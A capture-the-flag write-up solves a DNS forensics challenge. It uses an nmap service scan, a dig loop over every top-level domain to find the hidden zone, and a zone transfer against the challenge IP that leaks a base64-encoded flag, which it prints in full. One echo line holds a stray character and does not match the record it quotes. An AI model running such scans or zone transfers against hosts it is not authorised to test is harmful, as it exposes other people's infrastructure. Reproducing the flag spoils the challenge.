---
layout: writeup

title: Dean's Transfers
level: 6        # optional, for events that use levels (like HackyEaster)
difficulty: medium    # easy/medium/hard etc, if applicable
points: 200        # if used
categories: [forensics]  # e.g. crypto, pwn, reversing
tags: []        # anything notable about challenge/solution, vuln/tools/etc

flag: he2022{d34n_dr1v3s_you_3v3rywh3r3!!}

---

## Challenge

Dean just launched his taxi business named Dean's Transfers.

For his website, he first wanted to register deans-transfers.com, but then found out there are so many fancy top-level domains out there. You found a service running on his server - find a flag there!

The service is running on port 2211 on 46.101.107.117.

## Solution

There is nothing if we open this in the browser, and no response in netcat

The hint says "Service Fingerprinting"

So let's try to identify the service running on that port"

```
$ nmap 46.101.107.117 -p 2211 -sV

Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-05 21:56 CEST
Nmap scan report for 46.101.107.117
Host is up (0.070s latency).

PORT     STATE SERVICE VERSION
2211/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u6 (Debian Linux)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.84 seconds
```

ok, we see dns server running on the port, we can work with that.

so it sounds from the challenge description like the domain is deans-transfers.<tld>, but it's not .com, lets find out what it is

We vind a list of all TLDs here: https://data.iana.org/TLD/tlds-alpha-by-domain.txt

We loop over these and perform a dig command

```
$ for x in $(cat tlds-alpha-by-domain.txt); do dig +noall +answer +multiline deans-transfers.$x any -p 2211 @46.101.107.117; done;

deans-transfers.express. 302400 IN SOA deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. (
                                2          ; serial
                                302400     ; refresh (3 days 12 hours)
                                43200      ; retry (12 hours)
                                302400     ; expire (3 days 12 hours)
                                302400     ; minimum (3 days 12 hours)
                                )
deans-transfers.express. 302400 IN NS ns.deans-transfers.express.
```


Aha! so it's deans-transfers.express

Let's try a DNS zone tranfer

```
dig @46.101.107.117 -p 2211 axfr deans-transfers.express                                                                                           [05-05-22 21:49:25]

; <<>> DiG 9.16.15-Ubuntu <<>> @46.101.107.117 -p 2211 axfr deans-transfers.express
; (1 server found)
;; global options: +cmd
deans-transfers.express. 302400 IN      SOA     deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. 2 302400 43200 302400 302400
deans-transfers.express. 302400 IN      NS      ns.deans-transfers.express.
aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISF9.deans-transfers.express. 302400 IN A 10.0.0.8
base64decode.deans-transfers.express. 302400 IN A 10.0.13.9
ns.deans-transfers.express. 302400 IN   A       10.0.0.2
deans-transfers.express. 302400 IN      SOA     deans-transfers.express. admin.deans-transfers.express.deans-transfers.express. 2 302400 43200 302400 302400
;; Query time: 24 msec
;; SERVER: 46.101.107.117#2211(46.101.107.117)
;; WHEN: Thu May 05 21:49:32 CEST 2022
;; XFR size: 6 records (messages 1, bytes 309)
```

ooh, `aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISF9.deans-transfers.express` looks interesting, let's base64 decode that

```
$ echo "aGUyMDIye2QzNG5fZHIxdjNzX3lvdV8zdjNyeXdoM3IzISFf9" | base64 -d
he2022{d34n_dr1v3s_you_3v3rywh3r3!!}
```

